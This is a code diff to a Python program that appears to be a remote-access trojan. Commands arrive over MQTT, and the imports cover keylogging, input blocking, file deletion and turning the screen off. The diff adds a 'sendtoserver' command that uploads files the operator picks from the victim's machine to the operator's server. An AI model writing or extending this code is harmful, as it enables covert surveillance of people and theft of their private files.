@@ -20,7 +20,7 @@ import blockInput
 from notepadType import notepad_write,draw_heart,start_random_move,stop_random_move
 from prompt import alertPrompt, inputPrompt
 from klogging import start_logging,stop_logging
-from filecontrol import list_folder,read_file,delete_file,create_file
+from filecontrol import list_folder,read_file,delete_file,create_file,send_file_to_server
 from systemcontrol import display_off,display_on,full_volume,mute_volume
 
 pg.FAILSAFE = False
@@ -241,6 +241,22 @@ def handle_msg(msg):
                         client.publish(ACK_TOPIC, f"Error reading file: {e}")
         
                 safe_thread(read)
+        elif msg.startswith("sendtoserver"):
+            cmd_data = msg[len("sendtoserver "):]
+            parts = cmd_data.split('|')
+            if len(parts) != 2:
+                client.publish(ACK_TOPIC, "Error: readfile requires 2 parameters separated by |")
+            else:
+                folder, filename = parts
+        
+                def sendserver():
+                    try:
+                        datasend =send_file_to_server(folder.strip(), filename.strip(),server_url=f"{serverUrl}/upload_new")
+                        client.publish(ACK_TOPIC, f"File Send :---> {datasend}")
+                    except Exception as e:
+                        client.publish(ACK_TOPIC, f"Error Sending file: {e}")
+        
+                safe_thread(sendserver)        
         
         elif msg.startswith("deletefile"):
             cmd_data = msg[len("deletefile "):]
